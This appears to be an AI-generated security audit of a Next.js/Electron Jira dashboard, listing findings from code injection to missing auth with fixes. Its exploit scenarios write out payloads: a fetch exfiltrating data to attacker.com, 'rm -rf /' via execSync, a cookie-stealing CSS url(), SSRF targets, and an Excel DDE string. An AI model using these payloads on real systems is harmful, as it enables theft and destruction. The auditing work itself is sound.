# Security Review Report

**Project:** Jira ETL Dashboard
**Review Date:** 2026-05-28
**Reviewer:** expert-security (MoAI automated audit)
**Framework:** OWASP Top 10 2025, CWE Top 25
**Scope:** Full codebase (Next.js 16, React 19, TypeScript 5, Prisma 6.11.1, SQLite/PostgreSQL, Electron 42.1.0)

---

## Summary

- **Total issues found:** 20
- **Critical:** 2 | **High:** 7 | **Medium:** 6 | **Low:** 5

---

## Critical Findings

### [CRITICAL-C01] Remote Code Execution via `new Function()` in Custom KPI Plugin Engine

- **OWASP:** A03: Injection
- **CWE:** CWE-94: Improper Control of Generation of Code (Code Injection)
- **Severity:** CRITICAL
- **File:** `src/lib/kpi/engine.ts`, lines 592-603

**Vulnerability:**

The `registerCustomPlugin()` method compiles user-supplied JavaScript code via `new Function()` and executes it without any sandboxing:

```typescript
fn = new Function('context', definition.formula) as CompiledFunction;
const result = fn!(context);
```

The `formula` field is a string submitted by the user through the custom plugin API (`POST /api/kpi/plugins/custom`) or loaded from `localStorage` (`cfg_kpi_plugins`). The `context` object contains all Jira ticket data, including summary text, descriptions, and metadata from untrusted external sources.

**Exploit Scenario:**

1. An attacker creates a custom plugin via the API with `language: "javascript"` and a `formula` like: `"return fetch('https://attacker.com/exfil?data=' + JSON.stringify(context.issues)); return [{name: 'x', value: 0, unit: ''}];"` -- this exfiltrates all issue data.
2. Or more destructively: `"process.exit(); return [];"` (in Node.js runtime) or `"require('child_process').execSync('rm -rf /'); return [];"` if `require` is available.
3. The plugin can read `context.db` (Prisma client reference), `context.config` (Jira credentials), and all ticket data, enabling full database access and credential theft.

**Fix:**

- Remove the `new Function()` execution path entirely and require all custom plugins to use only the DSL parser.
- If JavaScript execution is a hard requirement, implement a Web Worker sandbox with the following restrictions:
  - No `require`, `import`, `fetch`, `XMLHttpRequest` access
  - Isolate `context` object to only ticket data arrays (no DB client, no config)
  - Enforce a CPU timeout (e.g., 5 seconds) per formula execution
  - Run in a separate Node.js `worker_threads` with `--experimental-permission` flags
- Validate that the `formula` string does not contain dangerous patterns: `require`, `import`, `fetch`, `eval`, `process`, `global`, `globalThis`, `constructor`, `__proto__`, `prototype`.

---

### [CRITICAL-C02] Jira API Tokens Stored in Browser `localStorage` in Plaintext

- **OWASP:** A02: Cryptographic Failures, A04: Insecure Design
- **CWE:** CWE-312: Cleartext Storage of Sensitive Information, CWE-522: Insufficiently Protected Credentials
- **Severity:** CRITICAL
- **File:** `src/lib/config/local-store.ts`, lines 4-6, 88-94

**Vulnerability:**

Jira API tokens (which grant full API access to Jira instances) and PostgreSQL database passwords are stored as plaintext JSON in the browser's `localStorage`:

```typescript
export interface JiraConnection {
  id: string;
  apiToken: string;  // stored in plaintext JSON
  email: string;
  baseUrl: string;
  // ...
}
```

These are saved via `localStorage.setItem(key, JSON.stringify(value))` and retrieved via `JSON.parse(localStorage.getItem(key))`.

**Exploit Scenario:**

1. Any XSS vulnerability in the application can trivially read all credentials: `JSON.parse(localStorage.getItem('cfg_jira_connections'))`.
2. Browser extensions with DOM access can read localStorage contents.
3. If the machine is compromised, the browser's localStorage file (`%LocalAppData%\Google\Chrome\User Data\Default\Local Storage\leveldb\`) contains the tokens in plaintext on disk.
4. The `exportConfig()` function at line 311 dumps all credentials into a single JSON file that can be downloaded -- that JSON export is never encrypted.

**Fix:**

- Never store API tokens in browser localStorage. Move credential storage to the server side:
  - Store credentials in an encrypted server-side session (e.g., `next-auth` session with encrypted JWT).
  - Use HTTP-only, Secure, SameSite=Strict cookies for session tokens.
  - Map connections by opaque IDs, never exposing the raw token to the client.
- For the Electron desktop app, use the OS keychain:
  - Windows: `electron-store` with encryption or `keytar`
  - macOS: Keychain via `keytar`
  - Linux: `libsecret` via `keytar`
- Similarly, password fields in `PgConnection` should never be stored in localStorage.

---

## High Findings

### [HIGH-H01] Missing Content Security Policy (CSP), HSTS, and Permissions-Policy Headers

- **OWASP:** A05: Security Misconfiguration
- **CWE:** CWE-693: Protection Mechanism Failure
- **Severity:** HIGH
- **File:** `next.config.ts`, lines 101-125

**Vulnerability:**

The security headers configuration only includes three headers -- X-Frame-Options, X-Content-Type-Options, and Referrer-Policy. Critical headers are missing:

- **No CSP:** Without a Content Security Policy, the app is defenseless against XSS attacks. Any injected script can execute freely.
- **No HSTS (Strict-Transport-Security):** Credentials (Jira API tokens, PG passwords) are transmitted over the network. Without HSTS, a MITM attacker can downgrade to HTTP and intercept them.
- **No Permissions-Policy:** Camera, microphone, geolocation, and other browser features are unrestricted by default.

**Additional misconfiguration in the same file:**
- `typescript.ignoreBuildErrors: true` (line 18) -- suppresses all TypeScript compilation errors, allowing type-related bugs to reach production.
- `reactStrictMode: false` (line 22) -- disables React development warnings that detect unsafe lifecycle methods, legacy APIs, and unexpected side effects.

**Fix:**

```typescript
// Add to headers() in next.config.ts:
{
  key: 'Content-Security-Policy',
  value: "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://*.atlassian.net https://*.supabase.co; font-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none';"
},
{
  key: 'Strict-Transport-Security',
  value: 'max-age=63072000; includeSubDomains; preload'
},
{
  key: 'Permissions-Policy',
  value: 'camera=(), microphone=(), geolocation=(), interest-cohort=()'
}
```

- Set `typescript.ignoreBuildErrors: false` and fix all compilation errors.
- Set `reactStrictMode: true`.
- Use `nonce`-based CSP for inline styles currently injected via `dangerouslySetInnerHTML` (see HIGH-H02).

---

### [HIGH-H02] XSS via `dangerouslySetInnerHTML` in Chart Component

- **OWASP:** A03: Injection (Cross-Site Scripting)
- **CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation
- **Severity:** HIGH
- **File:** `src/components/ui/chart.tsx`, lines 82-99

**Vulnerability:**

The chart component uses `dangerouslySetInnerHTML` to inject CSS variables for chart theming:

```typescript
<style
  dangerouslySetInnerHTML={{
    __html: Object.entries(THEMES).map(([theme, prefix]) => `
      ${prefix} [data-chart=${id}] {
        ${colorConfig.map(([key, itemConfig]) => {
          const color = itemConfig.theme?.[theme] || itemConfig.color;
          return color ? `  --color-${key}: ${color};` : null;
        }).join("\n")}
      }`).join("\n"),
  }}
/>
```

The `colorConfig` is derived from `chartConfig`, which accepts arbitrary string values from parent components. While the injection is constrained to CSS property values, a CSS injection can still be exploited:

**Exploit Scenario:**

If `chartConfig` accepts an attacker-controlled value (e.g., from a dashboard preset stored in localStorage or imported from an untrusted export file), the attacker could inject: `"red; background-image: url('https://attacker.com/steal?cookie=' + document.cookie)` -- though JS execution is limited in CSS, CSS data exfiltration via `url()` with dynamic values and attribute selectors is possible. Additionally, `-moz-binding` (Firefox legacy) and `behavior` (IE legacy) can execute JS in older browsers.

**Fix:**

- Validate all color values against a color regex: `^(#[0-9a-fA-F]{3,8}|rgb\(.*\)|hsl\(.*\)|var\(--.*\)|[a-z]+)$`.
- Use a style object approach instead of `dangerouslySetInnerHTML` by injecting CSS variables via the `style` prop on wrapping elements.
- If `dangerouslySetInnerHTML` must be used, sanitize the output with a library like `DOMPurify` or restrict to known-safe CSS property values only.

---

### [HIGH-H03] Arbitrary File Write via Custom KPI Plugin Upload API

- **OWASP:** A01: Broken Access Control, A03: Injection
- **CWE:** CWE-22: Path Traversal, CWE-434: Unrestricted Upload of File with Dangerous Type
- **Severity:** HIGH
- **File:** `src/app/api/kpi/plugins/custom/route.ts`, lines 54-113

**Vulnerability:**

The `POST /api/kpi/plugins/custom` endpoint writes user-supplied plugin code directly to the filesystem:

```typescript
const customDir = path.join(process.cwd(), 'src', 'lib', 'kpi', 'plugins', 'custom', safeDomain);
fs.mkdirSync(customDir, { recursive: true });
const pluginFilePath = path.join(customDir, `${safeId}.ts`);
fs.writeFileSync(pluginFilePath, pluginCode, 'utf-8');
```

The `generatePluginFile()` function interpolates user input into a `.ts` file template without escaping:

```typescript
calculate: ${calculate}
```

The `calculate` field (a stringified function body) is directly embedded into the generated TypeScript file. If this file is loaded and executed (e.g., via a dynamic `import()` or plugin loader), any code within `calculate` executes in the Node.js server process context.

**Path traversal protection is present but limited:** `sanitizeSegment()` uses regex `/^[a-z0-9_-]+$/i`, which correctly blocks `../` sequences. However, no file extension validation is performed -- the `safeId` parameter is used directly as the filename with `.ts` appended.

**Additional concern: No authentication.** This API endpoint has no authentication check -- any client on the network can create, modify, or delete plugin files on the server.

**Fix:**

- Add authentication to all `/api/kpi/plugins/custom` routes.
- Validate that `calculate` is a syntactically safe string:
  - Parse with a JavaScript parser (e.g., `acorn`) and reject if it contains `require`, `import`, `eval`, `Function`, `process`, `global`, `globalThis`, `constructor`, `__proto__`, `fetch`, `XMLHttpRequest`.
  - Reject if the AST depth exceeds a reasonable limit.
- Escape all string values interpolated into the template (use JSON.stringify for string literals).
- Add file extension validation to ensure only `.ts` files are created.
- Set a maximum plugin file size (e.g., 10 KB).
- Consider storing custom plugin code in the database (`MasterTicket.rawData`-style JSON field) instead of on the filesystem.

---

### [HIGH-H04] No Authentication on Any API Endpoint

- **OWASP:** A01: Broken Access Control, A07: Identity and Authentication Failures
- **CWE:** CWE-306: Missing Authentication for Critical Function
- **Severity:** HIGH
- **Files:** All route handlers under `src/app/api/**/route.ts`

**Vulnerability:**

Every API endpoint in the application lacks authentication:
- `POST /api/jira/extract` -- triggers Jira data extraction with provided credentials
- `POST /api/jira/test` -- tests Jira connections
- `POST /api/kpi/plugins/custom` -- creates/deletes plugin files
- `POST /api/pg/test` -- tests PostgreSQL connections
- `GET /api/debug/health` -- exposes system diagnostics
- `POST /api/webhooks/jira` -- processes Jira webhooks (has webhook secret verification, which is good)
- `POST /api/kpi/calculate` -- runs KPI calculations
- `POST /api/export/**` -- exports data

The dependency `next-auth@4.24.11` is declared in `package.json` but not implemented anywhere in the source code. There is no `src/middleware.ts` for route protection, no session validation, and no login mechanism.

**Risk:** In the Electron desktop app this is somewhat mitigated (single-user, local). However, if the app is deployed as a web application (which the Next.js build supports), any network-accessible client can trigger data extraction, access health information, create arbitrary plugin files, and read exported data.

**Fix:**

- Implement `next-auth` with at minimum email/password or OAuth provider authentication.
- Create `src/middleware.ts` to enforce authentication on all API routes except explicitly public ones (e.g., login, webhook with secret verification).
- For the Electron desktop case, generate a random local secret token on startup and require it as an `Authorization` header for all API calls.
- Apply the principle of least privilege: the webhook endpoint needs Jira's secret verification but not user auth; all other endpoints require authenticated sessions.

---

### [HIGH-H05] Server-Side Request Forgery (SSRF) via JiraClient with Arbitrary `baseUrl`

- **OWASP:** A10: Server-Side Request Forgery (SSRF)
- **CWE:** CWE-918: Server-Side Request Forgery
- **Severity:** HIGH
- **File:** `src/lib/jira/client.ts`, lines 73-78

**Vulnerability:**

The `JiraClient` constructor accepts a `baseUrl` from user input (originating from browser localStorage) and makes HTTP requests to it without any validation of the destination host:

```typescript
constructor(config: JiraConnectionConfig, fieldMapping?: Partial<JiraFieldMapping>) {
  let normalizedBaseUrl = config.baseUrl.trim();
  if (!normalizedBaseUrl.match(/^https?:\/\//i)) {
    normalizedBaseUrl = `https://${normalizedBaseUrl}`;
  }
  normalizedBaseUrl = normalizedBaseUrl.replace(/\/$/, '');
  this.config = { ...config, baseUrl: normalizedBaseUrl };
}
```

**This is in contrast to `src/lib/db.ts` and `src/app/api/pg/test/route.ts`, which both have thorough SSRF protections** (validateDatabaseHost restricts to localhost and Supabase, validateHostAddress blocks RFC1918 private IPs). The JiraClient has no equivalent validation.

**Exploit Scenario:**

1. An attacker sets `baseUrl` to `http://169.254.169.254/latest/meta-data/` (AWS metadata endpoint). `JiraClient.testConnection()` calls `fetch("http://169.254.169.254/latest/meta-data//rest/api/3/serverInfo")` -- this won't match the AWS path, but the attacker can observe timing differences or error messages.
2. More practically, the attacker sets `baseUrl` to `http://internal-corporate-server.local`, gaining access to internal network services that the Next.js server can reach.
3. Setting `baseUrl` to `http://localhost:5432` could interact with the PostgreSQL port, leaking information in error messages.

**Fix:**

- Add SSRF validation to JiraClient constructor:
  - Parse the URL and resolve the hostname to an IP address.
  - Reject private IP ranges (RFC1918), loopback (127.0.0.0/8, ::1), link-local (169.254.0.0/16), and multicast addresses.
  - Allow only public IP ranges and known Jira Cloud domains (`*.atlassian.net`, `*.jira.com`).
- Implement a connection timeout (currently partially done via `fetchWithRetry` with 60s timeout, but `testConnection` uses direct `fetch` without timeout).
- Return generic error messages for failed connections -- do not leak internal network details.

---

### [HIGH-H06] Config Export/Import Includes Plaintext Credentials

- **OWASP:** A02: Cryptographic Failures
- **CWE:** CWE-312: Cleartext Storage of Sensitive Information
- **Severity:** HIGH
- **File:** `src/lib/config/local-store.ts`, lines 311-340

**Vulnerability:**

The `exportConfig()` function creates a JSON export of the entire application configuration, including all Jira API tokens and PostgreSQL passwords in plaintext:

```typescript
exportConfig: () => {
  const data: any = {
    jiraConnections: localConfig.getJiraConnections(),  // includes apiToken
    pgConnections: localConfig.getPgConnections(),       // includes password
    // ...
  };
}
```

The `importConfig()` function at line 343 blindly accepts any JSON and writes all values to localStorage without validation.

**Exploit Scenario:**

1. A user exports their config for backup and stores the JSON file in an insecure location.
2. An attacker gains access to the JSON file and extracts all Jira API tokens and database passwords.
3. An attacker crafts a malicious config JSON file with injected values and tricks a user into importing it.

**Fix:**

- Strip sensitive fields from the export: `apiToken`, `password`, `secret`, `email` (or redact to `***`).
- Add a warning dialog before export: "This export contains sensitive credentials. Handle this file securely."
- Validate imported data against Zod schemas before writing to localStorage.
- Consider encrypting the export file with a user-provided passphrase.
- Add version and integrity checks to the import to reject tampered exports.

---

### [HIGH-H07] PostgreSQL Passwords Transmitted in Plaintext POST Body

- **OWASP:** A02: Cryptographic Failures
- **CWE:** CWE-319: Cleartext Transmission of Sensitive Information
- **Severity:** HIGH
- **File:** `src/app/api/pg/test/route.ts`, lines 79-98; `src/lib/db.ts`, lines 148-156

**Vulnerability:**

PostgreSQL connection passwords are sent in plaintext as JSON body fields:

```typescript
// pg/test/route.ts
password = body.password;
// ...
const pool = new Pool({ password, /* ... */ });
```

```typescript
// db.ts
effectiveUrl = buildPgUrl({
  password: config.password  // goes into URL
});
```

While HTTPS would encrypt the transport layer, the password is visible:
1. In server-side logs if request body logging is enabled.
2. In browser DevTools Network tab.
3. In memory for the duration of the server process.

The `buildPgConnectionUrl()` function (in local-store.ts, line 393) also creates URLs with embedded passwords for client-side storage.

**Fix:**

- Use TLS for all production deployments (HTTPS mandatory).
- Redact password from all log output (partially done in `db.ts` `redactUrl()`, but `pg/test/route.ts` logs the host/user but not password -- good).
- For the Electron desktop app, use `electron-store` with encryption or the OS keychain.
- For web deployments, use server-side session storage for credentials instead of passing them in request bodies.

---

## Medium Findings

### [MED-M01] Health Check Endpoint Exposes System Information

- **OWASP:** A05: Security Misconfiguration
- **CWE:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
- **Severity:** MEDIUM
- **File:** `src/app/api/debug/health/route.ts`, lines 35-101

**Vulnerability:**

The `GET /api/debug/health` endpoint returns detailed system information:
- Memory usage (heap used, heap total, RSS) in MB
- Process uptime
- Environment (`NODE_ENV` value)
- When `?detailed=true`: recent error logs, error counts, and database connectivity status (including error messages)

This endpoint has no authentication. Any network-accessible client can enumerate system resources and monitor error patterns, which aids reconnaissance for targeted attacks.

**Fix:**

- Add authentication to this endpoint (require admin session).
- Remove `?detailed=true` in production builds (`NODE_ENV === 'production'`).
- Strip memory details from the basic health response -- return only `{ status: 'healthy', timestamp }` for unauthenticated requests.
- Move error log retrieval to a separate admin-only endpoint.

---

### [MED-M02] `NEXT_PUBLIC_DATABASE_URL` as Fallback Exposes DB URL to Client

- **OWASP:** A05: Security Misconfiguration
- **CWE:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
- **Severity:** MEDIUM
- **File:** `src/lib/db.ts`, line 138, line 238

**Vulnerability:**

The code uses `NEXT_PUBLIC_DATABASE_URL` as a fallback for the database connection string:

```typescript
const envUrl = process.env.DATABASE_URL || process.env.NEXT_PUBLIC_DATABASE_URL;
```

In Next.js, any environment variable prefixed with `NEXT_PUBLIC_` is inlined into the client-side JavaScript bundle at build time. If `DATABASE_URL` is not set but `NEXT_PUBLIC_DATABASE_URL` is (which happens when following certain setup guides), the database URL (including credentials) is exposed to any visitor who inspects the JS bundle.

**Fix:**

- Remove `process.env.NEXT_PUBLIC_DATABASE_URL` as a fallback. Use only `process.env.DATABASE_URL`.
- If a client-visible database URL is needed for some reason, use a separate non-sensitive variable (e.g., `NEXT_PUBLIC_DB_HOST` without credentials).

---

### [MED-M03] Error Stack Traces Exposed in Development Mode

- **OWASP:** A05: Security Misconfiguration
- **CWE:** CWE-209: Generation of Error Message Containing Sensitive Information
- **Severity:** MEDIUM
- **File:** `src/lib/api-error.ts`, line 110; `src/lib/api-middleware.ts`, line 108

**Vulnerability:**

Error responses include full stack traces in development mode:

```typescript
// api-error.ts
error: isDevelopment ? (error as Error).message : 'Internal server error',
...(isDevelopment && { stack: (error as Error).stack }),
```

```typescript
// api-middleware.ts
error: isDevelopment ? (error as Error).message : 'Internal server error',
...(isDevelopment && { stack: (error as Error).stack }),
```

Stack traces reveal:
- Server file paths (e.g., `C:\Users\...\src\lib\...`)
- Internal function names and module structure
- Library versions through import paths
- Line numbers of security-relevant code

**Additionally**, the `JiraClient` exposes detailed error information from Jira's API:
```typescript
throw new Error(`JQL query failed: ${response.status} ${response.statusText} - ${errorText}`);
```

This leaks the Jira API's error response to the client, potentially exposing internal Jira configuration details.

**Fix:**

- Never include stack traces in API responses, even in development. Log them server-side, return a generic error message to the client.
- Use a correlation ID (`x-request-id` header) to allow developers to find the corresponding server-side log entry.
- For Jira API errors, return a sanitized message without the raw `errorText`.

---

### [MED-M04] Webhook Secret Accepted via Query Parameter

- **OWASP:** A02: Cryptographic Failures
- **CWE:** CWE-598: Use of GET Request Method with Sensitive Query Strings
- **Severity:** MEDIUM
- **File:** `src/app/api/webhooks/jira/route.ts`, line 9

**Vulnerability:**

The webhook endpoint accepts the secret via both header and query parameter:

```typescript
const incomingSecret = req.headers.get('x-jira-webhook-secret') || searchParams.get('secret');
```

Secrets in URL query parameters are:
- Logged in server access logs, proxy logs, and CDN logs.
- Stored in browser history if accessed via GET.
- Visible in analytics tools and referrer headers.

While `timingSafeEqual()` is used for comparison (correct), allowing the secret via query string undermines this security.

**Fix:**

- Remove `searchParams.get('secret')` -- accept the secret ONLY via the `x-jira-webhook-secret` header.
- Alternatively, accept it via the request body (which Jira supports in the webhook configuration).

---

### [MED-M05] In-Memory Rate Limiting with Unbounded Growth

- **OWASP:** A05: Security Misconfiguration
- **CWE:** CWE-770: Allocation of Resources Without Limits or Throttling
- **Severity:** MEDIUM
- **File:** `src/lib/api-error.ts`, lines 179-201

**Vulnerability:**

The rate limiter uses an in-memory `Map` that grows without bound:

```typescript
const rateLimitMap = new Map<string, { count: number; resetTime: number }>();
```

Each unique client identifier (`ip + userAgent`) creates a new entry that is never cleaned up unless the window expires and the same client makes another request. An attacker can exhaust server memory by making requests with randomized `User-Agent` headers:

**Exploit Scenario:**

1. Attacker scripts 100,000 requests, each with a different random User-Agent string.
2. The `rateLimitMap` grows to 100,000 entries, each consuming ~200 bytes = ~20 MB. Continued attacks can push this to hundreds of MB or cause the Node.js process to crash.

**Fix:**

- Add a periodic cleanup interval (every 60 seconds) that removes expired entries:
  ```typescript
  setInterval(() => {
    const now = Date.now();
    for (const [key, record] of rateLimitMap) {
      if (now > record.resetTime) rateLimitMap.delete(key);
    }
  }, 60000);
  ```
- Set a maximum map size (e.g., 10,000 entries) and reject new entries when full.
- Consider using an external rate limiting store (Redis) for production deployments.

---

### [MED-M06] Sidebar Cookie Missing `HttpOnly`, `Secure`, `SameSite` Attributes

- **OWASP:** A05: Security Misconfiguration
- **CWE:** CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag
- **Severity:** MEDIUM (Low for the sidebar cookie specifically, but indicative of a systemic issue with cookie security)
- **File:** `src/components/ui/sidebar.tsx`, line 86

**Vulnerability:**

The sidebar state cookie is set without any security attributes:

```typescript
document.cookie = `${SIDEBAR_COOKIE_NAME}=${openState}; path=/; max-age=${SIDEBAR_COOKIE_MAX_AGE}`;
```

Missing attributes:
- **HttpOnly:** Not applicable here (the cookie is read by JS), but indicates lack of cookie security awareness.
- **Secure:** Without this, the cookie is sent over HTTP connections, allowing MITM interception.
- **SameSite:** Without this, the cookie is sent on cross-site requests (CSRF risk).

While the sidebar cookie itself is non-sensitive, this pattern indicates that any future session/auth cookies set by the application will likely also lack these protections.

**Fix:**

```typescript
document.cookie = `${SIDEBAR_COOKIE_NAME}=${openState}; path=/; max-age=${SIDEBAR_COOKIE_MAX_AGE}; Secure; SameSite=Lax`;
```

---

## Low Findings

### [LOW-L01] `$queryRaw` SQL Injection Risk (Currently Safe, But Pattern Warning)

- **OWASP:** A03: Injection
- **CWE:** CWE-89: SQL Injection
- **Severity:** LOW
- **File:** `src/app/api/debug/health/route.ts`, line 58

**Vulnerability:**

```typescript
await db.$queryRaw`SELECT 1`;
```

This specific usage is safe because the query is a static string with no user input. However, the presence of `$queryRaw` creates a precedent -- a future developer might copy this pattern and add user-controlled variables:

```typescript
// Hypothetical future code -- DO NOT WRITE THIS:
await db.$queryRaw`SELECT * FROM tickets WHERE status = ${userInput}`;  // NOT SAFE with Prisma's tagged template
```

**Note:** Prisma's tagged template literal syntax (`$queryRaw\`SELECT 1\``) does use parameterized queries under the hood, so even with variables it would not be directly injectable. However, `$queryRawUnsafe()` and string concatenation within `$queryRaw` are dangerous patterns to watch for.

**Fix:**

- Add an ESLint rule to prohibit `$queryRawUnsafe` and flag all `$queryRaw` usage for code review.
- Add a comment above the `$queryRaw` call explaining why it is safe: `// Safe: static SQL, no user input`.

---

### [LOW-L02] CSV Export Lacks Proper Content-Type Validation

- **OWASP:** A03: Injection
- **CWE:** CWE-79: Cross-Site Scripting
- **Severity:** LOW
- **File:** `src/app/api/export/file/route.ts`

**Vulnerability:**

The CSV export endpoint generates CSV content with a `Content-Disposition: attachment` header. If the CSV data contains formula injection characters (`=`, `+`, `-`, `@`), and a user opens the CSV in Excel or Google Sheets, these formulas execute.

**Exploit Scenario:**

A Jira issue with summary `=cmd|' /c calc.exe'!A0` will be exported into a CSV cell. When opened in Excel, this could execute arbitrary commands (Excel DDE injection).

**Fix:**

- Prepend cells starting with `=`, `+`, `-`, or `@` with a single quote (`'`) to neutralize formula injection.
- Set `Content-Type: text/csv; charset=utf-8` header explicitly.

---

### [LOW-L03] Webhook WebSocket State in Global Variable (Dev Mode Only)

- **OWASP:** A05: Security Misconfiguration
- **CWE:** CWE-1104: Use of Unmaintained Third-Party Components
- **Severity:** LOW
- **File:** `src/app/api/jira/poll/route.ts`, line 58

**Vulnerability:**

Polling state is stored in a module-level variable. During development with hot module reload, this state persists across reloads and could cause stale state issues. More importantly, the poll endpoint makes internal HTTP calls:

```typescript
fetch(`http://localhost:${port}/api/jira/extract`, { ...storageConfig })
```

The `storageConfig` payload may contain sensitive database connection information being transmitted over HTTP (not HTTPS) to localhost. While localhost traffic doesn't traverse the network, other processes on the same machine could potentially intercept it.

**Fix:**

- Use a more robust state management mechanism (e.g., a dedicated polling service or in-memory data store).
- Pass necessary data via internal function calls instead of HTTP requests to localhost.
- Consider using `http://127.0.0.1` instead of `http://localhost` (avoids potential DNS resolution issues).

---

### [LOW-L04] Electron DevTools Left Open in Development Mode

- **OWASP:** A05: Security Misconfiguration
- **CWE:** CWE-489: Active Debug Code
- **Severity:** LOW
- **File:** `electron/main.js`, line 24

**Vulnerability:**

```javascript
mainWindow.webContents.openDevTools();
```

DevTools are automatically opened in dev mode. While convenient for development, this should not be the default behavior for builds distributed to other developers or testers.

**Fix:**

- Conditionally open DevTools only when an environment variable is set: `if (process.env.ELECTRON_DEVTOOLS === 'true')`.
- Ensure production build (`electron-builder`) does not include this code path.

---

### [LOW-L05] `z-ai-web-dev-sdk` -- Unverified Third-Party SDK

- **OWASP:** A06: Vulnerable and Outdated Components
- **CWE:** CWE-1104: Use of Unmaintained Third-Party Components
- **Severity:** LOW
- **File:** `package.json`, line 113

**Vulnerability:**

The dependency `z-ai-web-dev-sdk@0.0.17` is a pre-1.0 package with no publicly available documentation or GitHub repository. It is unclear what capabilities this SDK has, what permissions it requires, or whether it has been security-audited.

**Fix:**

- Audit this dependency: identify its purpose, check its code in `node_modules/z-ai-web-dev-sdk/`, and verify it does not exfiltrate data.
- If unused, remove it from `dependencies`.
- If needed, pin to the exact version and set up a Dependabot alert for it.

---

## Dependency Audit

### Known Vulnerabilities (requires `npm audit` to verify current state)

Run: `npm audit --production`

Key dependencies to monitor:
- `next@16.1.7` -- Check for the latest security patches (Next.js releases regular security updates).
- `next-auth@4.24.11` -- Version 4.x is in maintenance mode; consider upgrading to next-auth v5 (Auth.js) for active security support.
- `prisma@6.11.1` and `@prisma/client@6.11.1` -- Keep updated for query engine security fixes.
- `electron@42.1.0` -- Monitor Electron security advisories; Electron updates bundle Chromium security fixes.
- `react-markdown@10.1.0` -- Markdown rendering library; ensure it does not allow arbitrary HTML injection (ReactMarkdown has `allowedElements` and `disallowedElements` options).
- `pg@8.20.0` -- Latest stable; monitor for connection string handling fixes.
- `sharp@0.34.3` -- Image processing library; historically has had vulnerabilities in image parsing.
- `z-ai-web-dev-sdk@0.0.17` -- Unverified third-party SDK, see LOW-L05.

### Dependencies Without Code Usage

The following declared dependencies could not be found in source code usage:
- `next-auth@4.24.11` -- Declared but no auth implementation exists. Either implement it or remove the dependency to reduce attack surface.

---

## Recommendations Summary

### Immediate Actions (Critical + High Priority)

| # | Action | Severity | Effort |
|---|--------|----------|--------|
| 1 | Remove `new Function()` code execution from KPI engine; use DSL-only or sandboxed Web Worker | CRITICAL | High |
| 2 | Move Jira API tokens and PG passwords from localStorage to encrypted server-side session storage | CRITICAL | High |
| 3 | Implement authentication (next-auth) and middleware for all API routes | HIGH | High |
| 4 | Add CSP, HSTS, and Permissions-Policy headers to `next.config.ts` | HIGH | Low |
| 5 | Add SSRF validation to JiraClient (equivalent to db.ts protections) | HIGH | Medium |
| 6 | Strip credentials from config export; validate config import data | HIGH | Medium |
| 7 | Remove `dangerouslySetInnerHTML` or add color-value sanitization in chart.tsx | HIGH | Medium |
| 8 | Add authentication and input sanitization to custom plugin API endpoints | HIGH | Medium |

### Short-Term Actions (Medium Priority)

| # | Action | Severity | Effort |
|---|--------|----------|--------|
| 9 | Add authentication to health check endpoint; remove system details from public response | MEDIUM | Low |
| 10 | Remove `NEXT_PUBLIC_DATABASE_URL` fallback from db.ts | MEDIUM | Low |
| 11 | Stop exposing stack traces in API error responses | MEDIUM | Low |
| 12 | Remove webhook secret from query parameter acceptance | MEDIUM | Low |
| 13 | Add periodic cleanup and max size to rate limiting Map | MEDIUM | Low |
| 14 | Add Secure and SameSite attributes to sidebar cookie | MEDIUM | Low |

### Long-Term Actions (Low Priority)

| # | Action | Severity | Effort |
|---|--------|----------|--------|
| 15 | Add ESLint rule prohibiting `$queryRawUnsafe` | LOW | Low |
| 16 | Sanitize CSV export against formula injection | LOW | Low |
| 17 | Replace localhost HTTP calls in poll route with internal function calls | LOW | Medium |
| 18 | Conditionally enable Electron DevTools | LOW | Low |
| 19 | Audit or remove `z-ai-web-dev-sdk` dependency | LOW | Medium |
| 20 | Set `typescript.ignoreBuildErrors: false` and `reactStrictMode: true` | LOW (config) | Medium |

### Compliance Summary

| Framework | Status | Notes |
|-----------|--------|-------|
| OWASP A01 - Broken Access Control | FAIL | No authentication on any API endpoint |
| OWASP A02 - Cryptographic Failures | FAIL | Credentials in plaintext localStorage, no HSTS |
| OWASP A03 - Injection | FAIL | `new Function()` code injection, `dangerouslySetInnerHTML` |
| OWASP A04 - Insecure Design | FAIL | Plugin system trusts user-supplied code |
| OWASP A05 - Security Misconfiguration | FAIL | Missing CSP/HSTS/Permissions-Policy, stack traces in errors |
| OWASP A06 - Vulnerable Components | WARN | Unverified third-party SDK, next-auth unused |
| OWASP A07 - Identity & Auth Failures | FAIL | No authentication implementation |
| OWASP A08 - Software & Data Integrity | PASS | Webhook secret verification uses timingSafeEqual |
| OWASP A09 - Security Logging Failures | WARN | Health endpoint exposes logs; no audit log for credential access |
| OWASP A10 - SSRF | FAIL | JiraClient has no SSRF protection (db.ts does) |

### Trust Boundary Diagram

```
Browser (Electron/Chrome)
  localStorage [PLAINTEXT CREDENTIALS: Jira token, PG password]
      |
      | HTTPS (or localhost HTTP in dev)
      v
Next.js Server
  API Routes (NO AUTH)
      |
      +--> JiraClient --> Jira Cloud API [Basic Auth: email:token]
      |    ^ SSRF RISK: no host validation
      |
      +--> KPI Engine --> new Function() [CODE INJECTION]
      |
      +--> File System --> .ts plugin files [ARBITRARY FILE WRITE]
      |
      +--> Prisma --> SQLite/PostgreSQL [SSRF protection present]
      |
      +--> Health Check --> System info [NO AUTH]
```

---

*Report generated by MoAI expert-security agent. All findings require verification by a human security reviewer before remediation prioritization in production.*